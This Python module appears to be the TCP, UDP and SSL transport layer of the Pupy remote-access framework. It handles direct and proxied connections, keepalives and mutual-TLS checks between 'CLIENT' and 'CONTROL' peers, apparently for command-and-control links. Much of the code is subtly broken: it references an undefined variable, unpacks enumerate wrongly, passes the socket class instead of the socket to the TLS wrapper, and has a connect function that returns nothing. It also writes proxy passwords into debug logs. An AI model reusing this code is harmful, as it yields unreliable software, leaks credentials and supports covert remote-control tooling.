# -*- coding: utf-8 -*-

__all__ = ('register',)

from os import write, close, unlink

from socket import (
    socket, getaddrinfo, gaierror,
    AF_INET, AF_UNSPEC,
    SOCK_DGRAM, SOCK_STREAM,
    IPPROTO_TCP
)

from ssl import (
    SSLContext, wrap_socket,
    CERT_REQUIRED, CERT_NONE, PROTOCOL_TLS
)

from socket import error as socket_error
from tempfile import mkstemp

from .abstract_socket import (
    AbstractSocket, AbstractSocketServer
)

from network.lib import getLogger

from socket import SOL_SOCKET, SO_KEEPALIVE

try:
    from socket import (
        TCP_KEEPIDLE, TCP_KEEPINTVL, TCP_KEEPCNT
    )
except ImportError:
    TCP_KEEPIDLE = None
    TCP_KEEPINTVL = None
    TCP_KEEPCNT = None

try:
    from socket import SIO_KEEPALIVE_VALS
except ImportError:
    SIO_KEEPALIVE_VALS = None

logger = getLogger('tcp')


def register(schemas):
    schemas.update({
        'tcp': from_uri_tcp,
        'udp': from_uri_udp,
        'ssl': from_uri_ssl
    })


class TcpSocket(AbstractSocket):
    DEFAULT_TIMEOUT = 30
    SUPPORTED_PROXIES = ('SOCKS5', 'HTTP')


class InetSocketServer(AbstractSocketServer):
    DEFAULT_PORT = 443

    __slots__ = (
        'family', 'sockproto'
    )

    def __init__(
        self, uris, pupy_srv, transport_class, transport_kwargs={},
            family=AF_UNSPEC, sockproto=SOCK_STREAM):

        super(InetSocketServer, self).__init__(
            uris, pupy_srv, transport_class,
                transport_kwargs=transport_kwargs)

        self.family = family
        self.sockproto = sockproto

    def _impl_resolve(self, uris):
        pairs = []
        results = []

        for uri in uris:
            port = uri.port or self.DEFAULT_PORT
            if not uri.hostname:
                for any_addr in ('0.0.0.0', '::'):
                    pairs.append((any_addr, port, True))
            else:
                pairs.append((uri.hostname, port, False))

        for host, port, may_fail in pairs:
            try:
                propositions = getaddrinfo(
                    host, port, self.family, self.sockproto
                )

                for family, socktype, proto, _, addr in propositions:
                    results.append((family, socktype, proto, addr))

            except gaierror as e:
                logger.info(
                    '%s: Failed to resolve %s:%s: %s', self, host, port, addr, e
                )

                if not may_fail:
                    raise

        return results

    def _impl_bind(self, addresses):
        sockets = []

        try:
            for family, socktype, proto, addr in enumerate(addresses):
                sock = socket(family, socktype, proto)
                sock.bind(addr)

                sockets.append(sock)
        except Exception as e:
            logger.error('%s: Failed to bind %s: %s', self, addr, e)

            for sock in sockets:
                sock.close()

            raise

        self._sockets = sockets


class TcpSocketServer(AbstractSocketServer):
    pass


def from_uri_tcp(uri, *args, **kwargs):
    return from_uri_any(SOCK_STREAM, uri, *args, **kwargs)


def from_uri_udp(uri, *args, **kwargs):
    return from_uri_any(SOCK_DGRAM, uri, *args, **kwargs)


def from_uri_ssl(uri, *args, **kwargs):
    sock = from_uri_tcp(uri, *args, **kwargs)
    return wrap_ssl(sock, uri, *args, **kwargs)


def from_uri_any(required_socktype, uri, *args, **kwargs):
    proxies = kwargs.get('proxies', None)
    timeout = kwargs.get('timeout', TcpSocket.DEFAULT_TIMEOUT)

    if proxies:
        sock = _connect_proxies(proxies, uri, required_socktype, timeout)
    else:
        sock = _connect_direct(uri, required_socktype, timeout)

    sock.setsockopt(SOL_SOCKET, SO_KEEPALIVE, 1)

    if all((TCP_KEEPIDLE, TCP_KEEPINTVL, TCP_KEEPCNT)):
        sock.setsockopt(IPPROTO_TCP, TCP_KEEPIDLE, 1 * 60)
        sock.setsockopt(IPPROTO_TCP, TCP_KEEPINTVL, 5 * 60)
        sock.setsockopt(IPPROTO_TCP, TCP_KEEPCNT, 10)

    elif SIO_KEEPALIVE_VALS and hasattr(sock, 'ioctl'):
        sock.ioctl(SIO_KEEPALIVE_VALS, (1, 1*60*1000, 5*60*1000))

    if kwargs.get('nonblocking', False):
        sock.setblocking(0)

    return AbstractSocket(sock)


def wrap_ssl(sock, uri, *args, **kwargs):
    ssl_auth = kwargs.get('ssl_auth', True)
    ssl_protocol = kwargs.get('ssl_protocol', PROTOCOL_TLS)
    ssl_ciphers = kwargs.get(
        'ssl_ciphers', 'HIGH:!aNULL:!MD5:!RC4:!3DES:!DES')

    hostname = kwargs.get('hostname', uri.hostname)

    if not ssl_auth:
        ctx = SSLContext(ssl_protocol)
        ctx.verify_mode = CERT_NONE
        ctx.check_hostname = False
        ctx.set_ciphers(ssl_ciphers)

        return ctx.wrap_socket(sock, server_hostname=hostname)

    credentials  = kwargs.get('credentials', None)
    if not credentials:
        raise ValueError(
            'wrap_ssl: required keyword "credentials" is not specified')

    is_server = kwargs.get('server', False)

    cert = credentials['SSL_CLIENT_CERT']
    key = credentials['SSL_CLIENT_KEY']
    ca = credentials['SSL_CA_CERT']
    role = credentials.get(
        'role', 'CONTROL' if is_server else 'CLIENT'
    )

    try:
        fd_cert_path, tmp_cert_path = mkstemp()
        fd_key_path, tmp_key_path = mkstemp()
        fd_ca_path, tmp_ca_path = mkstemp()

        write(fd_cert_path, cert)
        close(fd_cert_path)
        write(fd_key_path, key)
        close(fd_key_path)
        write(fd_ca_path, ca)
        close(fd_ca_path)

    except OSError as e:
        logger.error("Error writing certificates to temp file %s", e)
        raise

    try:
        wrapped_socket = wrap_socket(
            socket,
            keyfile=tmp_key_path,
            certfile=tmp_cert_path,
            ca_certs=tmp_ca_path,
            server_side=False,
            cert_reqs=CERT_REQUIRED,
            ssl_version=ssl_protocol,
            ciphers=ssl_ciphers
        )

    finally:
        unlink(tmp_cert_path)
        unlink(tmp_key_path)
        unlink(tmp_ca_path)

    peer = wrapped_socket.getpeercert()

    peer_role = ''

    for (item) in peer['subject']:
        if item[0][0] == 'organizationalUnitName':
            peer_role = item[0][1]

    if not (role == 'CLIENT' and peer_role == 'CONTROL' or \
        role == 'CONTROL' and peer_role == 'CLIENT'):
        raise ValueError('Invalid peer role: {}'.format(peer_role))

    return wrapped_socket


def _connect_direct(uri, required_socktype, timeout):
    sock = None
    propositions = getaddrinfo(
        uri.hostname, uri.port, AF_UNSPEC, required_socktype
    )
    count = len(propositions)

    for idx, (family, socktype, proto, _, addr) in enumerate(propositions):
        sock = socket(family, socktype, proto)
        sock.settimeout(timeout)

        try:
            sock.connect(addr)
        except socket_error:
            if idx + 1 == count:
                raise


def _connect_proxies(proxies, uri, required_socktype, timeout):
    sock = socket(AF_INET, required_socktype)

    host = uri.hostname
    port = int(uri.port or 443)

    logger.debug(
        'Connect to: %s:%d timeout=%d via proxies',
        host, port, timeout)

    for proxy in proxies:
        proxy_addr = proxy.addr
        proxy_port = None

        if ':' in proxy_addr:
            proxy_addr, proxy_port = proxy_addr.rsplit(':', 1)
            proxy_port = int(proxy_port)

        logger.debug(
            'Connect via %s:%s (type=%s%s)',
            proxy_addr, proxy_port or 'default', proxy.type,
            ' auth={}:{}'.format(
                proxy.username, proxy.password
            ) if proxy.username else '')

        sock.add_proxy(
            proxy_type=proxy.type,
            addr=proxy_addr,
            port=proxy_port,
            rdns=True,
            username=proxy.username,
            password=proxy.password
        )

    sock.settimeout(timeout)
    sock.connect((host, port))

    logger.debug(
        'Connected to: %s:%d: %s', host, port, sock)

    return sock


def _bind(uri, *args, **kwargs):
    pupy_srv = kwargs.get('pupy_srv')
